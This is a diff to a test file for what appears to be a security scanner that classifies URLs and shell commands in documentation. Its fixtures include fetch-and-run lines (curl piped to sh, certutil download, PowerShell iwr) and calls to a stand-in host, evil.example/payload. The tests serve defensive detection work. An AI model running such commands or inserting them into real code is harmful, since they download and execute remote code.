@@ -180,6 +180,9 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
         "Webhook documentation: https://docs.example.com/webhooks\n",
         "C2 research: https://example.com/security\n",
         "config = {}  # docs: https://example.com/configuration\n",
+        "[Documentation](https://example.com/reference)\n",
+        "![Model diagram](https://example.com/model.png)\n",
+        "> - [Documentation](https://example.com/reference)\n",
         'def load():\n    """See https://docs.example.com/reference."""\n',
         "The result = https://example.com/reference in this example.\n",
         'The result = "https://example.com/reference" in this example.\n',
@@ -695,6 +698,7 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
         'RUN ["bash", "-e", "-c", "curl https://example.com/artifact | sh"]\n',
         "# curl https://example.com/artifact | sh\n",
         "certutil -urlcache -f https://example.com/artifact artifact.exe\n",
+        'certutil -urlcache -f "https://example.com/artifact" artifact.exe\n',
         "pwsh -NoProfile -Command iwr https://example.com/artifact\n",
         "pwsh -NoProfile iwr https://example.com/artifact\n",
         "echo ready; pwsh -NoProfile -Command iwr https://example.com/artifact\n",
@@ -755,6 +759,9 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         "# curl is documented at \\\n  https://docs.example.com/curl.\n",
         "# docs: https://docs.example.com/shell.\n",
         "# npm install is documented at https://docs.example.com/npm.\n",
+        "# Example: curl https://docs.example.com/curl.\n",
+        "# Example: curl \\\n  https://docs.example.com/curl.\n",
+        "# ADD https://docs.example.com/reference /tmp/reference\n",
         "> - Use curl for downloads; see https://docs.example.com/shell.\n",
     ],
 )
@@ -1113,6 +1120,7 @@ def test_text_scanner_indirect_network_api_call_remains_actionable(tmp_path: Pat
         'download(\n    "padding",\n    "https://evil.example/payload",\n)\n',
         'download(\n    Path("weights"),\n    "https://evil.example/payload",\n)\n',
         'download("' + ("padding" * 800) + '", "https://evil.example/payload")\n',
+        'handlers[0]("https://evil.example/payload")\n',
     ],
 )
 def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_path: Path, content: str) -> None:
